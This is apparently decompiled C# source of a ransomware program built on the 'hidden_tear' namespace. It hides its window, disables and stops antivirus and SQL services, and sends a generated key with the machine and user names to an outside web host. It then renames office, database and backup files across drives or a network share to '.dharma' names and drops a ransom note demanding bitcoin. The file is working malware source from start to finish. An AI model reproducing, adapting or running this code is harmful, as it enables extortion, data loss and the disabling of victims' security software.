using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "https://camphoraceous-bags.000webhostapp.com/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private bool test = true;

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		GetServiceName();
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public bool SendPassword(string password, string GuidPass)
	{
		try
		{
			if (string.IsNullOrEmpty(password))
			{
				return false;
			}
			string text = "Computer: " + computerName + ", UserName:" + userName + ", Password:" + password + " UniqueID: " + GuidPass;
			string address = targetURL + text;
			new WebClient().DownloadString(address);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private string EncodeString(string origText)
	{
		byte[] bytes = Encoding.Unicode.GetBytes(origText);
		return Convert.ToBase64String(bytes, 0, bytes.Length);
	}

	private void change(string script)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + script;
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public void EncryptFile(string file, string NewFile, string password)
	{
		try
		{
			string fileName = Path.GetFileName(file);
			if (!(fileName == "HOW_RECOVERY_FILES .txt"))
			{
				Console.WriteLine(file);
				FileInfo fileInfo = new FileInfo(NewFile);
				string text = "\"" + fileInfo.Name.ToString() + "\"";
				text = text.Remove(0, text.Length - 1);
				change("rename \"" + file + "\" \"" + fileInfo.Name.ToString() + "\"");
			}
		}
		catch (Exception ex2)
		{
			try
			{
				File.Copy(file, NewFile);
				File.Delete(file);
			}
			catch (Exception ex)
			{
				Console.WriteLine("File error: " + Environment.NewLine + file + Environment.NewLine + NewFile + ex.Message);
			}
			Console.WriteLine("File error: " + Environment.NewLine + file + Environment.NewLine + NewFile + ex2.Message);
		}
	}

	protected void GetServiceName()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		_ = Process.GetCurrentProcess().Id;
		string text = "SELECT * FROM Win32_Service WHERE Name like '%SQL%' or Name like 'ekrn'  or Name like 'MBAMService'  or Name like 'AvastSvc'  or Name like 'kavfswh'";
		ManagementObjectSearcher val = new ManagementObjectSearcher(text);
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\" + ((ManagementBaseObject)val2).get_Item("Name").ToString(), writable: true);
					registryKey.SetValue("Start", 4);
					ServiceController val3 = new ServiceController(((ManagementBaseObject)val2).get_Item("Name").ToString());
					val3.Stop();
					TimeSpan timeSpan = new TimeSpan(0, 0, 5);
					val3.WaitForStatus((ServiceControllerStatus)1, timeSpan);
				}
				catch (Exception)
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public void encryptDirectory(string location, string password, string GuidPass)
	{
		try
		{
			string[] source = new string[20]
			{
				".rpt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".sql", ".mdb",
				".sln", ".php", ".asp", ".aspx", ".psd", "pdf", ".mdf", ".ldf", ".ndf", ".bak"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			Console.WriteLine(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i].ToLower());
				if (source.Contains(extension))
				{
					string fileName = Path.GetFileName(files[i]);
					fileName = location + "\\" + EncodeString(fileName) + ".dharma";
					EncryptFile(files[i], fileName, password);
				}
			}
			messageCreator(location, GuidPass);
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Recycle") && !directories[j].Contains("Cache") && !directories[j].Contains("Common") && !directories[j].Contains("AppData") && !directories[j].Contains("Intel") && !directories[j].Contains("ProgramData") && (!directories[j].Contains("Program Files") || directories[j].Contains("SQL")))
				{
					encryptDirectory(directories[j], password, GuidPass);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Directory error: " + ex.Message);
		}
	}

	private void Encript(string path, string password, string GuidPass)
	{
		encryptDirectory(path, password, GuidPass);
	}

	public void startAction()
	{
		List<DriveInfo> list = DriveInfo.GetDrives().ToList();
		string password = CreatePassword(50);
		string guidPass = "2bef07a3-38e4-4187-abd3-1ca2ddf8a254";
		if (!SendPassword(password, guidPass))
		{
			Console.WriteLine("No password sent!!");
			return;
		}
		string path = "\\\\25.13.220.201\\c$";
		if (!test)
		{
			foreach (DriveInfo item in list)
			{
				path = item.ToString();
				Encript(path, password, guidPass);
			}
		}
		else
		{
			Encript(path, password, guidPass);
		}
		password = null;
		Console.WriteLine("All data encripted!!");
	}

	public void messageCreator(string path, string GuidPass)
	{
		try
		{
			path += "\\HOW_RECOVERY_FILES .txt";
			string[] contents = new string[1] { "ATTENTION!\r\n            Don't worry, you can return all your files!\r\n            All your files like photos, databases, documents and other important are encrypted with strongest encryption and unique key.\r\n            The only method of recovering files is to purchase decrypt tool and unique key for you.\r\n            This software will decrypt all your encrypted files." + Environment.NewLine + "What guarantees you have ? " + Environment.NewLine + Environment.NewLine + "You can send one of your encrypted file from your PC and we decrypt it for free.\r\n            But we can decrypt only 1 file for free.File must not contain valuable information. " + Environment.NewLine + "Please send bitcoin value to wallet 1Np89JYq16jho7aL7n5jZQRuMM8b7iYPiJ\r\n            Price of private key and decrypt software is 1.09 BTC.\r\n            Discount 50% available if you contact us first 24 hours, that's price for you is 0.55 BTC.\r\n            Please note that you'll never restore your data without payment.\r\n            Check your e-mail Spam or Junk folder if you don't get answer more than 6 hours." + Environment.NewLine + "To get this software you need write on our e-mail: \r\n            abcd987sz@protonmail.com " + Environment.NewLine + "Your personal ID:" + Environment.NewLine + GuidPass };
			File.WriteAllLines(path, contents);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
